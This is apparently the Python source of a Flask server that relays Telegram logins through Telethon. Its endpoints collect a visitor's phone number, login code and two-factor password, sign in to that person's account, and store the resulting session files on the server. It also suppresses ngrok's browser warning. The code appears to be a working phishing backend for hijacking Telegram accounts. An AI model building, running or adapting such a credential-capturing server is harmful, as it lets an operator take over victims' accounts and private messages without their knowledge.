import os
import asyncio
import logging
from flask import Flask, send_from_directory, request, jsonify
from flask_cors import CORS
from dotenv import load_dotenv
from telethon import TelegramClient
from telethon.errors import (
    PhoneCodeInvalidError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)
import threading

load_dotenv()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")

app = Flask(__name__)
CORS(app)

# In-memory store: { user_id: { phone, phone_code_hash, client } }
user_sessions = {}

# Dedicated event loop in background thread for Telethon
tele_loop = asyncio.new_event_loop()

def start_tele_loop():
    asyncio.set_event_loop(tele_loop)
    tele_loop.run_forever()

threading.Thread(target=start_tele_loop, daemon=True).start()


def run_async(coro):
    future = asyncio.run_coroutine_threadsafe(coro, tele_loop)
    return future.result(timeout=30)


# Ngrok browser warning bypass
@app.after_request
def add_ngrok_header(response):
    response.headers['ngrok-skip-browser-warning'] = 'true'
    return response


# ── Routes ───────────────────────────────────────────────────────────────────

@app.route('/')
def index():
    return send_from_directory('static', 'index.html')

@app.route('/<path:filename>')
def static_files(filename):
    return send_from_directory('static', filename)


@app.route('/send-otp', methods=['POST'])
def send_otp():
    data = request.get_json()
    phone = data.get('phone', '').strip()
    user_id = data.get('user_id', 'default')

    if not phone:
        return jsonify({'success': False, 'message': 'Phone number required'}), 400

    try:
        async def _send():
            client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
            await client.connect()
            result = await client.send_code_request(phone)
            user_sessions[user_id] = {
                'phone': phone,
                'phone_code_hash': result.phone_code_hash,
                'client': client
            }

        run_async(_send())
        logger.info(f"OTP sent to {phone} for user {user_id}")
        return jsonify({'success': True, 'message': 'OTP sent! Check your Telegram app.'})

    except Exception as e:
        logger.error(f"Send OTP error: {e}")
        return jsonify({'success': False, 'message': str(e)}), 500


@app.route('/verify-otp', methods=['POST'])
def verify_otp():
    data = request.get_json()
    user_id = data.get('user_id', 'default')
    otp = data.get('otp', '').strip()

    if user_id not in user_sessions:
        return jsonify({'success': False, 'message': 'No OTP requested. Please send OTP first.'}), 400

    session = user_sessions[user_id]
    phone = session['phone']
    phone_code_hash = session['phone_code_hash']
    client = session['client']

    try:
        async def _verify():
            await client.sign_in(phone, otp, phone_code_hash=phone_code_hash)

        run_async(_verify())

        # OTP verified, no 2FA — clean up session
        del user_sessions[user_id]
        logger.info(f"User {user_id} verified (no 2FA)")
        return jsonify({'success': True, 'twofa_required': False})

    except PhoneCodeInvalidError:
        return jsonify({'success': False, 'message': 'Invalid OTP. Please try again.'}), 400

    except SessionPasswordNeededError:
        # 2FA enabled — keep session alive for 2FA step
        logger.info(f"User {user_id} needs 2FA")
        return jsonify({'success': True, 'twofa_required': True})

    except Exception as e:
        logger.error(f"Verify OTP error: {e}")
        return jsonify({'success': False, 'message': str(e)}), 500


@app.route('/verify-2fa', methods=['POST'])
def verify_2fa():
    data = request.get_json()
    user_id = data.get('user_id', 'default')
    password = data.get('password', '').strip()

    if user_id not in user_sessions:
        return jsonify({'success': False, 'message': 'Session expired. Please start over.'}), 400

    client = user_sessions[user_id]['client']

    try:
        async def _2fa():
            # check_password is the correct Telethon method for 2FA
            await client.sign_in(password=password)

        run_async(_2fa())

        # 2FA done — clean up
        del user_sessions[user_id]
        logger.info(f"User {user_id} completed 2FA successfully")
        return jsonify({'success': True, 'message': '2FA verified!'})

    except PasswordHashInvalidError:
        return jsonify({'success': False, 'message': 'Wrong 2FA password. Please try again.'}), 400

    except Exception as e:
        logger.error(f"2FA error: {e}")
        return jsonify({'success': False, 'message': str(e)}), 500


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
